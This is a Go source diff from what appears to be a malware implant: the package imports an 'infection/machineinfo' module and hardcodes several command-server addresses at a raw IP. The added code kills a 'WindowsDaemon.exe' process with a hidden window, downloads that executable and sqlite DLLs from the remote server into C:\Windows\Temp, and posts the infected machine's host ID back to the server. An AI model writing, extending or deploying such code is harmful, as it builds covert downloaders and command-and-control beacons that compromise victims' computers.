@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"fmt"
 	"github.com/inconshreveable/go-update"
+	"github.com/parnurzeal/gorequest"
+	"infection/machineinfo"
 	"io"
 	"io/ioutil"
 	"log"
@@ -11,15 +13,26 @@ import (
 	"mime/multipart"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
+	"syscall"
 	"time"
 )
 
-const VERSION string = "1"
+const VERSION string = "2"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://111.231.82.173/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
+const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
+const CURRENTPATH = "C:\\Windows\\Temp\\"
+
+var HOSTID = machineinfo.GetSystemVersion().Hostid
+
+type Msg struct {
+	Hostid string `json:"hostid"`
+	Code   int    `json:"code"`
+}
 
 func RandInt64(min, max int64) int {
 	rand.Seed(time.Now().UnixNano())
@@ -83,6 +96,57 @@ func Removetempimages(filenames []string, finflag chan string) {
 	for _, name := range filenames {
 		os.Remove(name)
 	}
+}
+
+func KillCheck() {
+	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	// not Start will continue
+	killcheck.Run()
+}
+
+func MultiFileDown(files []string, step string) {
+	if len(files) == 0 && step == "init" {
+		var fileinit = []struct {
+			Name string
+		}{
+			{"WindowsDaemon.exe"},
+			{"sqlite3_386.dll"},
+			{"sqlite3_amd64.dll"},
+		}
+		for _, name := range fileinit {
+			Get(MIDFILE+name.Name, name.Name)
+		}
+	}
+}
+
+func Get(url string, file string) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return
+	}
+	body, _ := ioutil.ReadAll(resp.Body)
+	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
+}
+
+func FileExits(path string) error {
+	_, err := os.Stat(path)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func ErrorStatusCode(code int, hostid string, addr string) {
+	msg := Msg{
+		Hostid: hostid,
+		Code:   code,
+	}
+	_, _, _ = gorequest.New().
+		Post(addr).
+		Set("content-type", "application/x-www-form-urlencoded").
+		Send(msg).
+		End()
 }
 
 //func SystemCheck(){
